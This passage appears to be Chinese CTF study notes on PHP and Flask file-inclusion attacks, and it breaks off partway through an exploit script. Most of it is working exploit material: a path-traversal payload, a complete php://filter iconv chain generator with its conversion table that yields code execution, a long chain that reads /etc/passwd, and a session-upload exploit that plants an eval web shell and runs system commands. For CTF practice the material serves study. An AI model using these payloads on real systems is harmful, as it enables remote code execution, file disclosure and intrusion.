    <content type="html"><![CDATA[<h2 id="在python服务器上运行"><a href="#在python服务器上运行" class="headerlink" title="在python服务器上运行"></a>在python服务器上运行</h2><pre><code class="hljs">这种情况下网页由python(flask)写成，可以利用文件包含漏洞查看源码，首先需要知道源码文件名（一般情况下是app.py），可以通过包含根目录下`proc/self/cmdline`，查看启动当前进程的命令，得到源码文件名，再进行包含。</code></pre><h2 id="当要求包含的文件名中必须有特定字符"><a href="#当要求包含的文件名中必须有特定字符" class="headerlink" title="当要求包含的文件名中必须有特定字符"></a>当要求包含的文件名中必须有特定字符</h2><p>像这样</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>( <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;woofers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;meowers&quot;</span> ) !==  <span class="hljs-literal">false</span> || <span class="hljs-title function_ invoke__">strpos</span>( <span class="hljs-variable">$file</span>, <span class="hljs-string">&quot;index&quot;</span>))&#123;<br><span class="hljs-keyword">include</span> (<span class="hljs-variable">$file</span> . <span class="hljs-string">&#x27;.php&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><pre><code class="hljs">可以考虑使用woofers/../flag这样来回到上级目录再重新进入想要的文件**注意：**这里实际上存在的文件是 woofers.php、index.php本地测试时woofers.php/../flag和woofers/../flag均可以但是当时刷题时 只有woofers/../flag可以，不知道咋回事payload = ?catogory=php://filter/read=convert.base64-encode/resource=woofers/../flag.php</code></pre><h2 id="无法写入"><a href="#无法写入" class="headerlink" title="无法写入"></a>无法写入</h2><h3 id="filter链无中生有"><a href="#filter链无中生有" class="headerlink" title="filter链无中生有"></a>filter链无中生有</h3><p><a href="https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d">原文</a><br><a href="https://tttang.com/archive/1395/">tttang</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> base64<br><br>file_to_use = <span class="hljs-string">&quot;/etc/passwd&quot;</span><br><br>base64_payload = base64.b64encode(<span class="hljs-string">&#x27;&lt;?=`ls /`; ?&gt;&#x27;</span>.encode()).decode()<br><br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;+&#x27;</span> <span class="hljs-keyword">in</span> base64_payload):<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Invalid base64 payload&quot;</span>)<br>    exit(<span class="hljs-number">0</span>)<br><br>base64_payload = base64_payload.replace(<span class="hljs-string">&#x27;=&#x27;</span>,<span class="hljs-string">&#x27;&#x27;</span>)<br><br>conversions = &#123;<br>    <span class="hljs-string">&#x27;/&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;0&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.UCS-2LE.UCS-2BE|convert.iconv.TCVN.UCS2|convert.iconv.1046.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;2&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921&#x27;</span>,<br>    <span class="hljs-string">&#x27;3&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;4&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.IEC_P271.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;5&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.GBK.UTF-8|convert.iconv.IEC_P27-1.UCS-4LE&#x27;</span>,<br><span class="hljs-string">&#x27;6&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.CSIBM943.UCS4|convert.iconv.IBM866.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;7&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.EUCTW|convert.iconv.L4.UTF8|convert.iconv.866.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;8&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;9&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.ISO6937.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;A&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;B&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.CP1256.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;C&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR&#x27;</span>,<br>    <span class="hljs-string">&#x27;D&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.SJIS.GBK|convert.iconv.L10.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;E&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT&#x27;</span>,<br>    <span class="hljs-string">&#x27;F&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;G&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90&#x27;</span>,<br>    <span class="hljs-string">&#x27;H&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;I&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;J&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;K&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;L&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC&#x27;</span>,<br>    <span class="hljs-string">&#x27;M&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T&#x27;</span>,<br>    <span class="hljs-string">&#x27;N&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4&#x27;</span>,<br>    <span class="hljs-string">&#x27;O&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775&#x27;</span>,<br>    <span class="hljs-string">&#x27;P&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;Q&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;R&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4&#x27;</span>,<br><span class="hljs-string">&#x27;S&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF-8.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS&#x27;</span>,<br>    <span class="hljs-string">&#x27;T&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103&#x27;</span>,<br>    <span class="hljs-string">&#x27;U&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.CSISO2022KR|convert.iconv.ISO2022KR.UTF16|convert.iconv.CP1133.IBM932&#x27;</span>,<br>    <span class="hljs-string">&#x27;V&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB&#x27;</span>,<br>    <span class="hljs-string">&#x27;W&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936&#x27;</span>,<br>    <span class="hljs-string">&#x27;X&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;Y&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361&#x27;</span>,<br><span class="hljs-string">&#x27;Z&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;a&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;b&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;c&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2&#x27;</span>,<br>    <span class="hljs-string">&#x27;d&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.ISO-IR-111.UJIS|convert.iconv.852.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;e&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UTF16.EUC-JP-MS|convert.iconv.ISO-8859-1.ISO_6937&#x27;</span>,<br>    <span class="hljs-string">&#x27;f&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213&#x27;</span>,<br>    <span class="hljs-string">&#x27;g&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8&#x27;</span>,<br>    <span class="hljs-string">&#x27;h&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;i&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000&#x27;</span>,<br><span class="hljs-string">&#x27;j&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16&#x27;</span>,<br>    <span class="hljs-string">&#x27;k&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;l&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;m&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949&#x27;</span>,<br>    <span class="hljs-string">&#x27;n&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.ISO88594.UTF16|convert.iconv.IBM5347.UCS4|convert.iconv.UTF32BE.MS936|convert.iconv.OSF00010004.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;o&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE&#x27;</span>,<br>    <span class="hljs-string">&#x27;p&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4&#x27;</span>,<br>    <span class="hljs-string">&#x27;q&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.GBK.CP932|convert.iconv.BIG5.UCS2&#x27;</span>,<br>    <span class="hljs-string">&#x27;r&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.ISO-IR-99.UCS-2BE|convert.iconv.L4.OSF00010101&#x27;</span>,<br>    <span class="hljs-string">&#x27;s&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90&#x27;</span>,<br>    <span class="hljs-string">&#x27;t&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS&#x27;</span>,<br>    <span class="hljs-string">&#x27;u&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61&#x27;</span>,<br>    <span class="hljs-string">&#x27;v&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO_6937-2:1983.R9|convert.iconv.OSF00010005.IBM-932&#x27;</span>,<br>    <span class="hljs-string">&#x27;w&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE&#x27;</span>,<br>    <span class="hljs-string">&#x27;x&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS&#x27;</span>,<br>    <span class="hljs-string">&#x27;y&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT&#x27;</span>,<br>    <span class="hljs-string">&#x27;z&#x27;</span> : <span class="hljs-string">&#x27;convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937&#x27;</span>,<br>&#125;<br><br><br><span class="hljs-comment"># generate some garbage base64</span><br>filters = <span class="hljs-string">&quot;convert.iconv.UTF8.CSISO2022KR|&quot;</span><br>filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br><span class="hljs-comment"># make sure to get rid of any equal signs in both the string we just generated and the rest of the file</span><br>filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br><br><span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> base64_payload[::-<span class="hljs-number">1</span>]:<br>        filters += conversions[c] + <span class="hljs-string">&quot;|&quot;</span><br>        <span class="hljs-comment"># decode and reencode to get rid of everything that isn&#x27;t valid base64</span><br>        filters += <span class="hljs-string">&quot;convert.base64-decode|&quot;</span><br>        filters += <span class="hljs-string">&quot;convert.base64-encode|&quot;</span><br>        <span class="hljs-comment"># get rid of equal signs</span><br>        filters += <span class="hljs-string">&quot;convert.iconv.UTF8.UTF7|&quot;</span><br><br>filters += <span class="hljs-string">&quot;convert.base64-decode&quot;</span><br><br>final_payload = <span class="hljs-string">f&quot;php://filter/<span class="hljs-subst">&#123;filters&#125;</span>/resource=<span class="hljs-subst">&#123;file_to_use&#125;</span>&quot;</span><br>url = <span class="hljs-string">&quot;http://9d9bb361-ed34-4fb7-aecf-7b5429c61108.challenge.ctf.show/index/testJson&quot;</span><br>r = requests.get(url, params=&#123;<br>    <span class="hljs-string">&quot;data&quot;</span>: <span class="hljs-string">&#x27;&#123;&#x27;</span> + <span class="hljs-string">f&#x27;&quot;name&quot;:&quot;guest&quot;,&quot;__template_path__&quot;:&quot;<span class="hljs-subst">&#123;final_payload&#125;</span>&quot;&#x27;</span> + <span class="hljs-string">&#x27;&#125;&#x27;</span><br>&#125;)<br><br><span class="hljs-built_in">print</span>(r.text)<br></code></pre></td></tr></table></figure><p>同时也可以通过php:&#x2F;&#x2F;filter生成图片头信息,绕过检测<br><a href="https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91">https://github.com/Taiwan-Tech-WebSec/Bug-Report/issues/91</a></p><p><code>filter-chain</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">php:<span class="hljs-comment">//filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1162.UTF32|convert.iconv.L4.T.61|convert.iconv.ISO6937.EUC-JP-MS|convert.iconv.EUCKR.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=/etc/passwd</span><br></code></pre></td></tr></table></figure><h3 id="日志文件包含"><a href="#日志文件包含" class="headerlink" title="日志文件包含"></a>日志文件包含</h3><ol><li>包含服务器框架日志</li></ol><p>需要绝对路径,日志文件名,位置可知.</p><p>首先获取服务器根目录，<br>包含<code>/proc/8/cmdline</code>获得<code>WorkerMan: master process start_file=/var/www/html/webrooth1xaa/start.php</code>,结合本地的start.php位置可知,根目录为&#x2F;var&#x2F;www&#x2F;html&#x2F;webrooth1xaa</p><p>包含<code>&lt;?php ... ?&gt;</code>,将产生<code>include &lt;?php ... ?&gt;</code>错误,写入日志文件中,再包含日志文件</p><h3 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h3><p>题目<a href="https://ctf.show/challenges#easy_include-4260">easy_include</a></p><p>考点一:<br>file伪协议除了通过<code>file:///&lt;PATH&gt;</code>访问，也可以通过<code>file://localhost/&lt;PATH&gt;</code>访问<br>理论上可以通过<code>file://&lt;IP&gt;/&lt;PATH&gt;</code>访问, 但可能实际上不被允许, 只有<code>file://127.0.0.1/&lt;PATH&gt;</code>可行</p><p>考点二:<br>文件包含</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br>url = <span class="hljs-string">&quot;&quot;</span><br>data = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>,<br>    <span class="hljs-string">&#x27;1&#x27;</span>: <span class="hljs-string">&#x27;localhost/tmp/sess_aaa&#x27;</span>, <span class="hljs-comment"># include file://localhost/tmp/sess_aaa</span><br>    <span class="hljs-string">&#x27;cmd&#x27;</span>: <span class="hljs-string">&#x27;system(&quot;ls /&quot;);&#x27;</span> 